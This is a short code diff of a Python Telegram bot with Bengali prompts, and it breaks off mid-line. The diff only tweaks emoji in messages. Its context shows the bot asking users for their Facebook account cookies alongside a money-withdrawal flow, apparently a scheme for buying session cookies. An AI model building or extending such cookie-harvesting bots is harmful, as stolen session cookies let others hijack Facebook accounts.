@@ -450,7 +450,7 @@ def handle_menu(message):
             "withdraw_address": text,
             "state": 'WAITING_FOR_WITHDRAW_AMOUNT'
         })
-        bot.send_message(message.chat.id, "টাকার পরিমাণ লিখুন", reply_markup=cancel_keyboard(), parse_mode="Markdown")
+        bot.send_message(message.chat.id, "💰 টাকার পরিমাণ লিখুন", reply_markup=cancel_keyboard(), parse_mode="Markdown")
         return
 
     elif current_state == 'WAITING_FOR_WITHDRAW_AMOUNT':
@@ -531,4 +531,4 @@ def handle_menu(message):
         bot.send_message(message.chat.id, "📝 **আপনার ফেসবুক অ্যাকাউন্টের কুকিজটি দিন:** 🎯", reply_markup=cancel_keyboard(), parse_mode="Markdown")
     elif text == 'টাকা উত্তোলন':
         update_user_data(user_id, {"state": 'SELECT_WITHDRAW_METHOD'})
-        bot.send_message(message.chat.id, "💰
+        bot.send_message(message.chat.id, 
